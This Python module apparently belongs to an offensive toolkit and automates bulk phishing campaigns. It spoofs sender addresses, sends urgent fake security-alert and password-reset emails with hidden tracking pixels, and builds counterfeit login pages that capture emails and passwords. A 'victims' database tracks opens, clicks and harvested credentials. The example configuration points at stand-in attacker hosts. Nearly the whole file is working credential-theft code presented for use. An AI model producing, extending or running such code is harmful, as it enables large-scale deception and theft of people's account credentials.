#!/usr/bin/env python3
"""
ARDF v2 Social Engineering Module
Bulk email phishing campaigns, credential harvesting, campaign tracking
Based on EL-MAL SOCXIST playbook
"""

import asyncio
import smtplib
import sqlite3
import json
import secrets
import logging
from typing import Dict, List, Optional
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class PhishingTemplate(Enum):
    """Standard phishing templates"""
    CREDENTIAL_RESET = "credential_reset"
    SECURITY_ALERT = "security_alert"
    PAYMENT_UPDATE = "payment_update"
    ACCOUNT_VERIFICATION = "account_verification"
    URGENT_ACTION = "urgent_action"


@dataclass
class PhishingCampaign:
    """Campaign configuration"""
    campaign_id: str
    campaign_name: str
    smtp_server: str
    smtp_port: int
    smtp_username: str
    smtp_password: str
    spoofed_from: str
    subject_line: str
    template_type: PhishingTemplate
    phishing_url: str
    tracking_server: str
    target_list_file: str


class CredentialHarvestingServer:
    """Credential harvesting page server"""
    
    def __init__(self, port: int = 8080, ssl_cert: Optional[str] = None, ssl_key: Optional[str] = None):
        """Initialize harvesting server"""
        self.port = port
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.harvested_credentials = []
    
    async def start(self):
        """Start harvesting server"""
        logger.info(f"[*] Credential harvesting server starting on port {self.port}")
    
    def create_login_page(self, target_domain: str, phishing_url: str, callback_url: str) -> str:
        """Create realistic login page"""
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Sign In - {target_domain}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .login-container {{
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            padding: 40px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        h1 {{
            font-size: 24px;
            margin: 0;
            color: #333;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }}
        input[type="text"],
        input[type="password"],
        input[type="email"] {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }}
        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="email"]:focus {{
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }}
        .submit-btn {{
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }}
        .submit-btn:hover {{
            background: #5568d3;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>{target_domain}</h1>
            <p style="color: #666; margin: 10px 0 0 0;">Sign in with your account</p>
        </div>
        
        <form action="{callback_url}" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="submit-btn">Sign In</button>
        </form>
        
        <p style="text-align: center; color: #999; font-size: 12px; margin-top: 20px;">
            This is a secure {target_domain} login page
        </p>
    </div>
</body>
</html>'''
        return html
    
    def handle_credential_submission(self, email: str, password: str, ip_address: str, user_agent: str) -> bool:
        """Handle submitted credentials"""
        
        credential = {
            'email': email,
            'password': password,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'timestamp': datetime.now().isoformat()
        }
        
        self.harvested_credentials.append(credential)
        logger.info(f"[+] Credentials harvested: {email}")
        
        return True


class PhishingCampaignOrchestrator:
    """Complete phishing campaign automation"""
    
    def __init__(self, campaign: PhishingCampaign):
        """Initialize orchestrator"""
        self.campaign = campaign
        self.db = self._init_database()
        self.smtp = None
        self.harvesting_server = CredentialHarvestingServer()
    
    def _init_database(self) -> sqlite3.Connection:
        """Initialize tracking database"""
        db_path = f"campaigns/{self.campaign.campaign_id}.db"
        
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        
        # Victims table
        c.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY,
                email TEXT UNIQUE,
                first_name TEXT,
                last_name TEXT,
                organization TEXT,
                sent_at DATETIME,
                opened BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked BOOLEAN DEFAULT 0,
                clicked_at DATETIME,
                submitted BOOLEAN DEFAULT 0,
                submitted_at DATETIME,
                ip_address TEXT,
                user_agent TEXT,
                status TEXT DEFAULT "pending"
            )
        ''')
        
        # Campaign statistics table
        c.execute('''
            CREATE TABLE IF NOT EXISTS statistics (
                metric TEXT PRIMARY KEY,
                value INTEGER,
                last_updated DATETIME
            )
        ''')
        
        # Credentials table
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                email TEXT,
                password TEXT,
                submitted_at DATETIME,
                ip_address TEXT,
                harvested BOOLEAN DEFAULT 0
            )
        ''')
        
        conn.commit()
        return conn
    
    def _setup_smtp(self) -> smtplib.SMTP:
        """Setup SMTP connection with spoofing"""
        smtp = smtplib.SMTP(self.campaign.smtp_server, self.campaign.smtp_port)
        smtp.starttls()
        smtp.login(self.campaign.smtp_username, self.campaign.smtp_password)
        return smtp
    
    def load_target_list(self) -> List[Dict]:
        """Load target email list from file"""
        targets = []
        
        try:
            with open(self.campaign.target_list_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse: email, first_name, last_name, organization
                    parts = line.split(',')
                    if len(parts) >= 1:
                        target = {
                            'email': parts[0].strip(),
                            'first_name': parts[1].strip() if len(parts) > 1 else '',
                            'last_name': parts[2].strip() if len(parts) > 2 else '',
                            'organization': parts[3].strip() if len(parts) > 3 else ''
                        }
                        targets.append(target)
        
        except FileNotFoundError:
            logger.error(f"[-] Target list not found: {self.campaign.target_list_file}")
        
        return targets
    
    def generate_phishing_email(self, target: Dict) -> MIMEMultipart:
        """Generate customized phishing email"""
        
        msg = MIMEMultipart('alternative')
        
        # Spoofing headers
        msg['From'] = self.campaign.spoofed_from
        msg['To'] = target['email']
        msg['Subject'] = self.campaign.subject_line
        msg['Date'] = datetime.now().strftime('%a, %d %b %Y %H:%M:%S +0000')
        
        # Reputation headers
        msg['X-Priority'] = '1'
        msg['X-MSMail-Priority'] = 'High'
        msg['Importance'] = 'high'
        msg['X-Originating-IP'] = f"[192.168.1.1]"
        
        # Generate tracking ID
        tracking_id = secrets.token_hex(16)
        
        # Create tracking pixel
        tracking_pixel = f'''<img src="{self.campaign.tracking_server}/track/{tracking_id}" 
                          width="1" height="1" style="display:none;" />'''
        
        # Generate template
        html_body = self._generate_template(
            target,
            self.campaign.phishing_url,
            tracking_pixel,
            self.campaign.template_type
        )
        
        part = MIMEText(html_body, 'html')
        msg.attach(part)
        
        # Store tracking info
        c = self.db.cursor()
        c.execute('''
            INSERT OR REPLACE INTO victims 
            (email, first_name, last_name, organization, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            target['email'],
            target['first_name'],
            target['last_name'],
            target['organization'],
            'sent'
        ))
        self.db.commit()
        
        return msg
    
    def _generate_template(self, target: Dict, phishing_url: str, 
                         tracking_pixel: str, template_type: PhishingTemplate) -> str:
        """Generate phishing email template"""
        
        first_name = target.get('first_name', 'User')
        
        if template_type == PhishingTemplate.CREDENTIAL_RESET:
            return self._credential_reset_template(first_name, phishing_url, tracking_pixel)
        
        elif template_type == PhishingTemplate.SECURITY_ALERT:
            return self._security_alert_template(first_name, phishing_url, tracking_pixel)
        
        elif template_type == PhishingTemplate.ACCOUNT_VERIFICATION:
            return self._account_verification_template(first_name, phishing_url, tracking_pixel)
        
        else:
            return self._default_template(first_name, phishing_url, tracking_pixel)
    
    def _credential_reset_template(self, name: str, url: str, pixel: str) -> str:
        """Credential reset phishing template"""
        return f'''
        <html>
        <body style="font-family: Arial, sans-serif;">
            <p>Hi {name},</p>
            
            <p>We detected unusual activity on your account. For security reasons, 
            we need you to verify your identity.</p>
            
            <p style="text-align: center; margin: 30px 0;">
                <a href="{url}" style="background: #007bff; color: white; 
                   padding: 12px 30px; text-decoration: none; border-radius: 4px;
                   display: inline-block;">
                    Verify Your Identity
                </a>
            </p>
            
            <p>If you did not attempt to access your account, please secure it immediately.</p>
            
            <p>Best regards,<br/>Security Team</p>
            {pixel}
        </body>
        </html>
        '''
    
    def _security_alert_template(self, name: str, url: str, pixel: str) -> str:
        """Security alert template"""
        return f'''
        <html>
        <body style="font-family: Arial, sans-serif;">
            <p>Hi {name},</p>
            
            <p style="color: #d9534f; font-weight: bold;">
                ⚠️ SECURITY ALERT: Unauthorized Access Attempt
            </p>
            
            <p>Your account was targeted in a login attempt from an unknown device.</p>
            
            <p><strong>Location:</strong> Unknown<br/>
            <strong>Device:</strong> Unknown<br/>
            <strong>Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
            
            <p style="text-align: center; margin: 30px 0;">
                <a href="{url}" style="background: #d9534f; color: white; 
                   padding: 12px 30px; text-decoration: none; border-radius: 4px;
                   display: inline-block;">
                    Secure Your Account Now
                </a>
            </p>
            
            <p>Security Team</p>
            {pixel}
        </body>
        </html>
        '''
    
    def _account_verification_template(self, name: str, url: str, pixel: str) -> str:
        """Account verification template"""
        return f'''
        <html>
        <body style="font-family: Arial, sans-serif;">
            <p>Hi {name},</p>
            
            <p>We need you to verify your account due to recent security updates.</p>
            
            <p style="text-align: center; margin: 30px 0;">
                <a href="{url}" style="background: #5cb85c; color: white; 
                   padding: 12px 30px; text-decoration: none; border-radius: 4px;
                   display: inline-block;">
                    Verify Account
                </a>
            </p>
            
            <p>Thank you,<br/>Account Security Team</p>
            {pixel}
        </body>
        </html>
        '''
    
    def _default_template(self, name: str, url: str, pixel: str) -> str:
        """Default generic template"""
        return f'''
        <html>
        <body style="font-family: Arial, sans-serif;">
            <p>Hi {name},</p>
            
            <p>Please click the link below to continue:</p>
            
            <p style="text-align: center; margin: 30px 0;">
                <a href="{url}" style="background: #007bff; color: white; 
                   padding: 12px 30px; text-decoration: none; border-radius: 4px;
                   display: inline-block;">
                    Click Here
                </a>
            </p>
            
            <p>If you have any questions, please contact support.</p>
            {pixel}
        </body>
        </html>
        '''
    
    async def send_campaign(self, throttle_delay: float = 1.0, batch_size: int = 10):
        """Send bulk phishing emails"""
        
        self.smtp = self._setup_smtp()
        targets = self.load_target_list()
        
        logger.info(f"[*] Starting campaign: {self.campaign.campaign_name}")
        logger.info(f"[*] Total targets: {len(targets)}")
        
        sent_count = 0
        
        for i, target in enumerate(targets):
            try:
                msg = self.generate_phishing_email(target)
                
                self.smtp.send_message(msg)
                
                # Update database
                c = self.db.cursor()
                c.execute('''
                    UPDATE victims SET sent_at = ? WHERE email = ?
                ''', (datetime.now(), target['email']))
                self.db.commit()
                
                sent_count += 1
                
                if (i + 1) % batch_size == 0:
                    logger.info(f"[+] Sent {i + 1}/{len(targets)} emails")
                
                await asyncio.sleep(throttle_delay)
            
            except Exception as e:
                logger.error(f"[-] Failed to send to {target['email']}: {str(e)}")
        
        self.smtp.quit()
        
        logger.info(f"[+] Campaign complete: {sent_count}/{len(targets)} sent")
        return sent_count
    
    def get_campaign_stats(self) -> Dict:
        """Get campaign statistics"""
        
        c = self.db.cursor()
        
        # Get counts
        c.execute('SELECT COUNT(*) FROM victims WHERE sent_at IS NOT NULL')
        sent = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM victims WHERE opened = 1')
        opened = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM victims WHERE clicked = 1')
        clicked = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM credentials')
        harvested = c.fetchone()[0]
        
        stats = {
            'campaign_name': self.campaign.campaign_name,
            'total_sent': sent,
            'total_opened': opened,
            'total_clicked': clicked,
            'credentials_harvested': harvested,
            'open_rate': f"{(opened/sent*100):.1f}%" if sent > 0 else "0%",
            'click_rate': f"{(clicked/sent*100):.1f}%" if sent > 0 else "0%",
            'credential_rate': f"{(harvested/sent*100):.1f}%" if sent > 0 else "0%"
        }
        
        return stats


class BulkEmailManager:
    """Manages multiple campaigns"""
    
    def __init__(self):
        self.campaigns = {}
    
    def create_campaign(self, campaign: PhishingCampaign) -> PhishingCampaignOrchestrator:
        """Create new campaign"""
        orchestrator = PhishingCampaignOrchestrator(campaign)
        self.campaigns[campaign.campaign_id] = orchestrator
        return orchestrator
    
    async def execute_all_campaigns(self):
        """Execute all campaigns in parallel"""
        tasks = [
            campaign.send_campaign()
            for campaign in self.campaigns.values()
        ]
        results = await asyncio.gather(*tasks)
        return results
    
    def generate_report(self) -> Dict:
        """Generate report for all campaigns"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'total_campaigns': len(self.campaigns),
            'campaigns': {}
        }
        
        for campaign_id, orchestrator in self.campaigns.items():
            report['campaigns'][campaign_id] = orchestrator.get_campaign_stats()
        
        return report


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    # Example usage
    campaign = PhishingCampaign(
        campaign_id='test_campaign_001',
        campaign_name='Test Campaign',
        smtp_server='smtp.gmail.com',
        smtp_port=587,
        smtp_username='attacker@gmail.com',
        smtp_password='app_password_here',
        spoofed_from='security@company.com',
        subject_line='Account Verification Required',
        template_type=PhishingTemplate.CREDENTIAL_RESET,
        phishing_url='https://phishing.attacker.com/login',
        tracking_server='https://tracking.attacker.com',
        target_list_file='targets.csv'
    )
    
    manager = BulkEmailManager()
    orchestrator = manager.create_campaign(campaign)
    
    # Send campaign
    # asyncio.run(orchestrator.send_campaign(throttle_delay=2.0, batch_size=50))
    
    # Get stats
    # stats = orchestrator.get_campaign_stats()
    # print(json.dumps(stats, indent=2))
